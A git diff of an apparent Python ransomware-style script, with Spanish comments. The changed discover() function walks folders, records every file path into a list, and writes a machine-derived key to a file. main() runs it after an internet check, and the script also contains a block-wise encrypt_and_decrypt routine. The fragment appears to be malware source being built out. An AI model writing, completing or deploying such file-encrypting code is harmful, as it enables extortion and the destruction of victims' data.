@@ -70,7 +70,7 @@ def encrypt_and_decrypt(archivo, crypto, block_size=16):
 			contenido_sincifrar = archivo_enc.read(block_size)
 
 
-def discover():
+def discover(key):
 	lista_archivos = open('lista_archivos', 'w+')
 
 	for carpeta in carpetas:
@@ -84,17 +84,25 @@ def discover():
 						lista_archivos.write(os.path.join(rutabs, file)+'\n')
 	lista_archivos.close()
 
+		# abrimos y listamos el contenido del archivo 
+	lista = open('lista_archivos', 'r')
+	lista = lista.read().split('\n')
+		# eliminamos el elemento nulo (vacio) del archivo
+	lista = [l for l in lista if not l == '']
 
+	key_file = open('key_file', 'w+')
+	key_file.write(key)
+	key_file.close()
 
 
 
 
 def main():
 	check_internet()
-	discover()
 	hashcomputer = get_hash()
 	#print(hashcomputer)
 	#print(len(hashcomputer))
+	discover(hashcomputer)
 
 if __name__ == '__main__':
 	try:
